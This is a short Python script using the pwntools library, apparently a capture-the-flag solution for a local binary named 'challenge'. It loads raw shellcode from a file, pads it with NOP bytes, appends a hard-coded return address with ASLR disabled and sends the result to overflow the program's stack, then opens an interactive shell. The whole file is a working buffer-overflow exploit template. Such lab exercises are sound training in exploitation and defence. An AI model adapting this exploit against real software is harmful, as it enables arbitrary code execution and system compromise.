import pwn 
#pwn.context.log_level = 'debug'

#r = pwn.process(["gdb", "./challenge"], aslr=False)
r = pwn.process("./challenge", aslr=False)
shellcode = b''
with open("shellcode-raw", 'rb') as f:
    shellcode = f.read()
print(shellcode)
payload = shellcode + b'\x90' * (120-len(shellcode)) + pwn.p64(0x7fffffffd4a0)
#r.sendline("b *main+83")
#r.sendline("b *main+122")
#r.sendline("r")
r.sendline(payload)
r.interactive()
#print(r.recvall().decode())
